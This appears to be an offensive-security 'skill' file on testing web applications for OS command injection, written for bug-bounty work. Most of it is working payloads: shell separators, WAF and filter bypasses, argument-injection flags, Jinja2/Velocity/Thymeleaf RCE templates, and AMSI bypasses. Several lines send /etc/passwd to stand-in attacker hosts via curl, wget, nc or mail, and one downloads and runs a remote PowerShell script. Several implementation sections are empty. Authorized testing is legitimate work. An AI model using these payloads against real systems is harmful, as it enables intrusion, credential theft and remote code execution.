---

name: web-06-command-injection
sequence: web-06
category: injection
domain: web
description: "OS command injection testing skill for offensive security and bug bounty. Covers error-based, blind time-based, blind OOB, argument injection, file upload filename injection, email injection via sendmail, template-to-CMDi chains, and Windows-specific payloads. Use when testing for command injection in web applications."
wordlist_ref: "wordlists/web/web-25-cmdi/"
---

# OS Command Injection — Offensive Testing Methodology

## Quick Workflow

1. Identify attack surface and entry points specific to this vulnerability class
2. Run detection probes to confirm vulnerability presence
3. Escalate with bypass techniques if initial probes are blocked
4. Confirm exploitation and assess impact
5. Document findings with proof of concept and suggest remediation

---

## Purpose
Detect OS command injection in all parameter types (query, POST body, JSON, headers, file upload
filenames) across all injection contexts using commix, interactsh OOB, and time-based blind

## OWASP Mapping
- A03:2021 Injection
- CWE-77: Improper Neutralization of Special Elements used in a Command
- CWE-78: Improper Neutralization of Special Elements used in an OS Command
- CWE-88: Argument Injection

## Vulnerability Classes

### 1. Error-Based / Response-Reflected CMDi

**Separator payloads:**
```bash
; id                          # semicolon separator (Unix)
| id                          # pipe separator
& id                          # background execution (Windows/Unix)
&& id                         # conditional AND
|| id                         # conditional OR
`id`                          # backtick substitution
$(id)                         # command substitution
%0aid                         # URL-encoded newline
%0d%0aid                      # URL-encoded CRLF
; id #                        # semicolon + comment
```

```bash
commix --url "https://target.com/ping?host=INJECT" \
  --data "host=127.0.0.1" \
  --level 3 --risk 2 \
  --cookie "sessionid=abc123" \
  --header "Authorization: Bearer eyJhbGci..." \
  --technique E  # error-based ONLY in Phase 1
```

### 2. Blind Time-Based CMDi


```bash
; sleep 10                    # Unix sleep
& timeout /t 10               # Windows timeout
$(sleep 10)                   # command substitution sleep
`sleep 10`                    # backtick sleep
| ping -c 10 127.0.0.1       # ping-based delay
```

**Statistical confidence:** Minimum 3 independent timing confirmations with consistent delta before HIGH scoring.

### 3. Blind OOB CMDi (Preferred over time-based)

```bash
; curl http://{interactsh_host}/cmdi-{unique_id}
$(curl http://{interactsh_host}/cmdi-{unique_id})
; nslookup {interactsh_host}
; ping -c 1 {interactsh_host}
| wget http://{interactsh_host}/cmdi-{unique_id}
```

### 4. WAF Bypass Techniques (Tier 4)

```bash
# Space bypass
${IFS}id           # IFS = Internal Field Separator (space in bash)
{id}               # brace expansion
$'\x20'id         # hex-encoded space

# Keyword bypass
i\d               # backslash escape
/???/bin/id       # glob expansion for /usr/bin/id
/usr/b?n/id       # single char wildcard
$PATH$PS1id       # variable confusion

# Encoding
$(printf '\x69\x64')   # hex-encoded 'id'
$( base64 -d <<< aWQ=) # base64-encoded 'id'
```

### 5. Windows-Specific Payloads

```
& whoami
; whoami
^whoami         # caret escape
%0whoami        # null terminator in some contexts
CMD /C whoami
POWERSHELL -C whoami
```

---

## HackerOne Report Patterns

**H1 Pattern 1 — CMDi in DNS lookup feature:**
`?host=google.com;cat /etc/passwd` → shell metacharacters in "ping this host" feature → direct output in response. $2k–$10k.

**H1 Pattern 2 — Blind CMDi via OOB:**
`?host=$(nslookup attacker.interactsh.com)` → DNS lookup reveals command execution possible. H1 HIGH, $3k–$8k.

**H1 Pattern 3 — CMDi via file upload filename:**
Filename `shell.php; id.jpg` → image processing uses filename in shell command → `id` output returned in processing logs. H1 CRITICAL.

**H1 Pattern 4 — Argument injection (not shell meta):**
`convert --format jpeg -resize 200x200 "{user_input}" output.jpg` — inject `"; rm -rf /tmp/x"` as format value → argument injection bypasses shell-metachar filters.

---

## 8. Argument Injection (Non-Shell-Metachar)

**Vulnerability:** Command-line tools execute with arguments parsed by the OS, not a shell. Injecting extra flags/arguments bypasses shell-metachar filters and can modify behavior, leak data, or enable RCE.

### Attack Vector: Flag Injection

**Scenario:** Application builds a CLI command like:
```bash
imagemagick convert "$user_filename" -resize 200x200 output.jpg
```

Attacker injects: `input.jpg -authenticate admin` → becomes:
```bash
convert input.jpg -authenticate admin -resize 200x200 output.jpg
```

If `-authenticate` reads a password file, RCE possible. If `-write /tmp/shell.php` is possible, code execution.

### Examples by Tool

**ImageMagick:**
```
--format=/tmp/pwned     # Write output to /tmp/pwned
-write /tmp/shell.php   # Write arbitrary file
-authenticate admin     # Read auth data (info disclosure)
-debug coder            # Verbose output (info disclosure)
```

**GraphicsMagick (gm):**
```
-authenticate 'id'      # Command execution in delegate
-format '%O'            # Output file format injection
```

**FFmpeg:**
```
-vf 'format=pix_fmts'   # Filter injection
-playlist_type m3u8     # M3U8 playlist injection
-hls_key_info_file /etc/passwd  # File read
```

**GhostScript:**
```
-dPDFDontUseFonts
-sDEVICE=pipe           # Pipe output to command
-sOutputFile=|id        # Command injection via pipe
```

**Tier 4 Payload (Argument Injection):**
```
payload = "--output=/tmp/pwned"
payload = "--debug=../../../etc/passwd"
payload = "-write|id"
payload = "$(whoami).jpg"
payload = "-format=%G"
payload = "--exec=/bin/sh"
```

### Confirmation Signals
- `error_pattern`: Tool error message revealing injected argument processing
- `separator_reflection`: Output filename changed (e.g., file created at `/tmp/pwned`)
- `cli_confirmed`: commix detects argument boundary confusion

---

## 9. Email Injection via Sendmail Command

**Vulnerability:** If application passes user input to `sendmail` command via shell, semicolons/pipes enable email header injection or command injection.

### Attack Vector: sendmail Command Injection

**Scenario:** Email form with vulnerable code:
```bash
sendmail -t < <<EOF
Subject: Contact Form
From: $user_email
To: admin@example.com
$body
EOF
```

Attacker email: `attacker@evil.com; cat /etc/passwd | sendmail -v admin@evil.com #`

Results in:
```bash
sendmail -v < <<EOF
...
From: attacker@evil.com; cat /etc/passwd | sendmail -v admin@evil.com #
...
EOF
```

**sendmail command injection payloads:**
```
user@host; id; echo
user@host$(whoami)@evil.com
user@host; cat /etc/passwd | mail attacker@evil.com; echo
user@host" -C/tmp/sendmail.cf "
user@host -O QueueDirectory=/tmp
```

### Email Header Injection

```
user@host%0aBcc:attacker@evil.com
user@host%0aSubject:Pwned
user@host%0d%0aCc:attacker@evil.com
"user@host%0aSubject:Pwned"@example.com
```

**FROM header injection:**
```
From: attacker@evil.com; id; echo
From: $(whoami)@attacker.evil.com
From: " -X /tmp/maillog -C /tmp/sendmail.cf #
```

### Tier 3 Payload (Email injection)
```
payload = "attacker@evil.com; id; echo"
payload = "user@host%0aBcc:attacker@evil.com"
payload = "user@host\nSubject:Pwned"
payload = "\" -X /tmp/maillog #"
```

---

## 10. File Upload Filename Command Injection

**Vulnerability:** If application processes uploaded filenames via shell command (e.g., ImageMagick, GhostScript, MediaInfo), filename becomes injection vector.

### Prerequisites
- Endpoint has `upload_endpoints` from web-02-crawler
- Server processes files with shell-invoked tool (imagemagick convert, ffmpeg, etc.)
- No filename sanitization

### Attack Vector: File Processing

**Scenario:** File upload endpoint processes image:
```bash
convert "$upload_dir/$filename" -resize 200x200 "$output_dir/$filename.thumb"
```

Attacker uploads file named: `shell.php; id; echo .jpg`

Server executes:
```bash
convert /uploads/shell.php; id; echo .jpg -resize 200x200 /thumbs/shell.php; id; echo .jpg.thumb
```

Result: `id` command runs, output captured in processing logs.

### Filename Payloads

**Shell metachar:** (Tier 1)
```
shell.php; id; echo .jpg
image.jpg| id | cat
image.jpg` id `
image.jpg$(whoami).jpg
image.jpg`id`.jpg
```

**URL-encoded:** (Tier 2)
```
image%3Bid%3B.jpg
image.jpg%7Cid
image.jpg%24%28id%29
```

**Null byte bypass:** (Tier 3)
```
shell.php%00.jpg
image.jpg\x00id
shell.php.jpg%00.gif
```

**Double-encoded:** (Tier 3)
```
image%253Bid.jpg
image.jpg%252524%252528id%252529
```

**Tier 4 argument injection:**
```
-write|whoami.jpg
--format=%O.jpg
-authenticate id.jpg
-exec whoami.jpg
```

**Tier 6 OOB:**
```
image.jpg$(curl http://interactsh.host/cmdi).jpg
shell.php; wget http://interactsh.host/upload.jpg -O /tmp/x
image.jpg`nslookup interactsh.host`
```

### Implementation


---

## 11. Template Injection Leading to Command Injection

**Vulnerability:** Server-side template engines (Jinja2, Velocity, Thymeleaf) with SSTI + command injection chain.

### Attack Vector: SSTI RCE via CMDi

**Scenario 1: Jinja2 (Python)**
```
{{ 7*7 }}                              # SSTI verification
{{ "".__class__.__mro__[1].__subclasses__()[408]('id', shell=True).communicate() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

If template engine runs in command-executing context:
```
{{ request.environ['SERVER_NAME'] }}; id; echo
{{ app.config['SECRET_KEY'] }};id;echo
```

**Scenario 2: Velocity (Java)**
```
#set($x='')#set($rt=$x.getClass().forName('java.lang.Runtime'))#set($chr=$x.getClass().forName('java.lang.Character'))#set($str=$x.getClass().forName('java.lang.String'))$rt.getRuntime().exec('id')
```

**Scenario 3: Thymeleaf (Java)**
```
[(#$_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)][@java.lang.Runtime@getRuntime().exec('id')]
```

**Scenario 4: Template + bash command**
```
User name: {{user.name}};id;echo
Profile: {{profile.bio}}|cat /etc/passwd
```

If template variable is used in shell command:
```bash
mail -s "Request from {{user.email}}" admin@example.com < body.txt
```

Injecting `user.email = "test@host.com\nSubject: Pwned"`

### Tier 4 Payloads (Template + CMDi)
```
payload = "{{7*7}};id;echo"
payload = "{{ ''.__class__.__mro__[1].__subclasses__()[408]('id').communicate() }};echo"
payload = "user@host.com\nSubject: Pwned\nBcc: attacker@evil.com"
payload = "${IFS}{{7*7}}"
payload = "%0a{{7*7}}%0a"
```

### Implementation


---

## 12. Windows-Specific Command Injection

**Vulnerability:** Windows command shell (cmd.exe) has different separators and escape rules than Unix shells.

### Windows Command Separators

| Separator | Behavior |
|-----------|----------|
| `;` | Statement terminator (works in batch/PowerShell) |
| `&` | Background execution (also works) |
| `\|` | Pipe (works) |
| `&&` | Conditional AND (works) |
| `\|\|` | Conditional OR (works) |
| `%0a` | Newline (some contexts) |
| `^` | Escape character (cmd.exe specific) |

### Windows-Specific Payloads

**Tier 1: Basic separators**
```
& whoami
; whoami
\| whoami
&& whoami
\|\| whoami
```

**Tier 4: Windows escape/bypass**
```
w^hoami
wh^oami
^whoami
%0aWHOAMI
```

**Tier 4: PowerShell encoding**
```
-EncodedCommand (base64-encoded command)
Payload: whoami → Base64: d2hvYW1p
-EncodedCommand d2hvYW1p
```

**Tier 5: AMSI bypass (PowerShell)**
```
-NoProfile -ExecutionPolicy Bypass -C "$([IO.File]::ReadAllText('C:\\Windows\\win.ini'))"
iex(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```

### AMSI Bypass Payloads
```
[Ref].Assembly.GetType('System.Management.Automation.Amsi')|?{$_}|%{$_.GetField('amsiInitFailed','NonPublic').SetValue($null,$true)}
$ExecutionContext.SessionState.LanguageMode='ConstrainedLanguage'
```

### Tier 4 CMDi payloads (Windows)
```
payload = "& whoami"
payload = "; whoami"
payload = "^whoami"
payload = "%0aWHOAMI"
payload = "-EncodedCommand d2hvYW1p"
payload = "| Select-Object -First 1"
payload = "-NoProfile -C \"whoami\""
```

### Implementation


---

## 13. Language-Specific Code Execution Patterns

### PHP: shell_exec / exec / system / passthru / popen

**Vulnerable patterns:**
```php
<?php
$output = shell_exec($_GET['cmd']);          // Dangerous
$result = exec($_GET['cmd']);                // Dangerous
system($_GET['cmd']);                        // Dangerous
$handle = popen($_GET['cmd'], "r");          // Dangerous
passthru($_GET['cmd']);                      // Dangerous

// Even with basename():
shell_exec("convert " . basename($_GET['file']));  // Still vulnerable to arg injection
?>
```

**Payloads:**
```
?cmd=id
?cmd=id;ls
?cmd=$(whoami)
?cmd=`cat /etc/passwd`
?cmd=id|base64
?file=image.jpg;id;
?file=--write|id.jpg
```

**Tier 6 OOB:**
```
?cmd=curl http://interactsh.host/cmdi
?cmd=wget http://interactsh.host/$(whoami)
?cmd=nslookup interactsh.host
```

### Node.js: child_process.exec / execFile / spawn

**Vulnerable patterns:**
```javascript
// child_process.exec - uses shell
app.get('/api/cmd', (req, res) => {
  exec(`ping ${req.query.host}`, (err, stdout) => {
    res.send(stdout);  // Vulnerable
  });
});

// child_process.execFile - direct execution (safer but still vulnerable to arg injection)
app.get('/api/convert', (req, res) => {
  execFile('convert', [req.query.input, req.query.output], (err, stdout) => {
    res.send(stdout);
  });
});

// child_process.spawn - safer (no shell)
spawn('ping', [req.query.host]);  // Safer, but still vulnerable if args parsed wrong
```

**Payloads:**
```
?host=google.com;id;
?host=$(whoami)
?input=image.jpg;id;
?input=image.jpg$(whoami)
?output=/tmp/pwned
```

**Tier 6 OOB:**
```
?host=`curl http://interactsh.host/cmdi`
?host=$(nslookup interactsh.host)
```

### Python: os.system / subprocess.call(shell=True)

**Vulnerable patterns:**


**Payloads:**
```
?cmd=id
?cmd=id;ls
?cmd=$(whoami)
?cmd=`id`
?target=127.0.0.1;cat /etc/passwd
?filename=image.jpg;id;
```

**Tier 6 OOB:**
```
?cmd=python -c "import urllib.request; urllib.request.urlopen('http://interactsh.host/cmdi')"
?target=$(curl http://interactsh.host/cmdi)
```

### Implementation


---

## 14. Out-of-Band (OOB) Callback Interpretation

**Critical:** OOB callback (DNS or HTTP) ONLY confirms command execution, NOT command output. Document this clearly for finding credibility.

### DNS Callback (OOB DNS)

**Payload:**
```
; nslookup attacker-xxxx.interactsh.com
; host attacker-xxxx.interactsh.com
; dig attacker-xxxx.interactsh.com
$(nslookup attacker-xxxx.interactsh.com)
`host attacker-xxxx.interactsh.com`
```

**What it confirms:**
- Server executed DNS lookup command ✓
- Network outbound DNS enabled ✓
- Command execution possible ✓

**What it does NOT confirm:**
- Output of actual command (e.g., contents of `/etc/passwd`) ✗
- Specific RCE capability ✗
- Severity of impact ✗

**Finding credibility:**
```
DNS callback: MEDIUM-HIGH confidence
Reason: Confirms command execution, rules out false positives from error-based output alone
Next step: Attempt error-based or file-read extraction to prove data access
```

### HTTP Callback (OOB HTTP)

**Payload:**
```
; curl http://attacker-xxxx.interactsh.com/cmdi
; wget http://attacker-xxxx.interactsh.com/cmdi
$(curl http://attacker-xxxx.interactsh.com/cmdi)
| curl http://attacker-xxxx.interactsh.com/cmdi
```

**What it confirms:**
- Server executed HTTP client command ✓
- Network outbound HTTP enabled ✓
- Command execution possible ✓

**What it does NOT confirm:**
- Specific data exfiltration ✗
- File access ✓

**HTTP callback with data exfiltration (Tier 6):**
```
; curl http://attacker-xxxx.interactsh.com/cmdi?data=$(id)
$(curl -G --data-urlencode "data=$(cat /etc/passwd)" http://attacker-xxxx.interactsh.com/)
; wget --post-data="$(cat /etc/passwd)" http://attacker-xxxx.interactsh.com/
```

**Interpretation:**
```
HTTP callback with command output in query param: HIGH confidence RCE + data access
Reason: Proves command execution + output extraction in single callback
```

### Interactsh Integration


---

## 15. commix Technique Ordering: Error-Based Before Time-Based

**CRITICAL ordering specification — must be enforced in Phase 1.**

### Phase 1 Execution Order

1. **Error-based (`technique="E"`) — ALWAYS first**
   - Fast (no sleep)
   - Low false positive (command output in response)
   - Detects most CMDi cases
   - If confirmed → emit HIGH signal immediately

2. **Time-based (`technique="T"`) — ONLY if error-based clean**
   - Slow (includes sleep delays)
   - HIGH false positive (network jitter, GC pauses, load variation)
   - Only run if error-based returned clean result

3. **OOB (Tier 6) — parallel with time-based**
   - Fast (no sleep)
   - Very low false positive
   - Preferred over time-based

### Implementation


**Guard rule:**


**Verdict logic:**
```
if error_pattern signal (+5):
    → HIGH (score ≥ 5, single category sufficient)

elif oob_dns or oob_http signal (+4):
    → combine with cli_confirmed (+3) if both present
    → score 7 + 2 categories = HIGH

elif cli_confirmed signal (+3) alone:
    → MEDIUM (score 3, 1 category)
    → require Phase 3 to confirm

else if timing_anomaly signal (+1) alone:
    → SUPPRESS (timing alone is FORBIDDEN signal source)
    → require supporting evidence from other category
```

---

## 16. Log Injection Leading to Command Injection

**Vulnerability:** User input logged without sanitization, then log file processed by vulnerable component.

### Attack Vector: Log Parser RCE

**Scenario 1: User-Agent logged and parsed by log analysis script**
```
User-Agent: Mozilla/5.0; id; echo
```

Application logs:
```
2026-04-06 10:00:00 [127.0.0.1] User-Agent: Mozilla/5.0; id; echo
```

Log rotation script processes logs with vulnerable regex:
```bash
cat access.log | grep "User-Agent:" | sed 's/.*User-Agent: //' | while read ua; do
  echo "$ua" | mail-parser  # If mail-parser shell-executes, CMDi possible
done
```

**Scenario 2: X-Forwarded-For header injection**
```
X-Forwarded-For: 127.0.0.1; cat /etc/shadow; echo
```

Log file:
```
[127.0.0.1; cat /etc/shadow; echo] GET /api/users
```

Log aggregation tool (e.g., Splunk, ELK) parses IP and executes:
```
geoip_lookup "127.0.0.1; cat /etc/shadow; echo"
```

**Scenario 3: Custom header logged and processed**
```
X-Debug: true; nc attacker.com 1234 < /etc/passwd
```

Log processing:
```bash
grep "X-Debug:" logs.txt | cut -d: -f2 | xargs -I {} bash -c "test {} && exec {}"
```

### Log Injection Payloads

**Tier 1: Direct injection**
```
; id; echo
| id | cat
& whoami &
${IFS}id
```

**Tier 2: URL-encoded**
```
%3Bid%3B
%7Cid%7C
%26whoami%26
```

**Tier 3: Log-specific encoding**
```
\x3bid\x3b        # Hex encoding
\u003bid\u003b    # Unicode
```

**Tier 4: Argument injection**
```
--exec=/bin/sh
-C /tmp/malicious.conf
--output=/tmp/pwned
```

**Tier 6: OOB**
```
; curl http://interactsh.host/log-injection
$(wget http://interactsh.host/data)
```

### Header Vectors

| Header | Log Field | Tool | Payloads |
|--------|-----------|------|----------|
| User-Agent | user_agent | Various parsers | `; id; echo` |
| X-Forwarded-For | client_ip | geoip_lookup | `127.0.0.1; id; echo` |
| Referer | referrer | URL parser | `http://host; id; echo` |
| X-Original-URL | url | sed/awk | `; cat /etc/passwd` |
| Accept-Language | lang | system() call | `en-US; id; echo` |

### Implementation




## Hacker Mindset

**Look for the edge cases.** Vulnerabilities live in the gap between what the developer assumed and what the framework actually does. Test every boundary: empty values, nulls, arrays, negative numbers, Unicode, very long strings.

**Blind detection always needs OOB.** If you can't see the output, set up a callback. No OOB = no confirmation.

**Chaining turns low/med into critical.** A single path traversal is medium. Path traversal + log file + admin session = RCE. Always think about what comes next.



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed



## Tools

- Burp Suite (manual testing + Intruder)
- curl / httpx
- Nuclei templates
- commix


## Bypass Techniques

| Filter/Block | Bypass |
|-------------|--------|
| WAF block | Encoding, case variation, comment injection |
| Input sanitization | Double encoding, Unicode, null bytes |
| Rate limiting | X-Forwarded-For rotation, HTTP/2 multiplex |
| Blacklist | Alternative syntax, polyglot payloads |


## Wordlist Invocation

When testing this vulnerability, invoke the wordlist payloads manually:

**Wordlist**: `wordlists/web/web-25-cmdi/`

**Files**:
- `wordlists/web/web-25-cmdi/payloads/cmdi/` — staged exploit payloads (low → med → high)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)
4. Always establish a baseline response before running time-based payloads

**Tools**: curl, httpx, Burp Suite, or any HTTP client

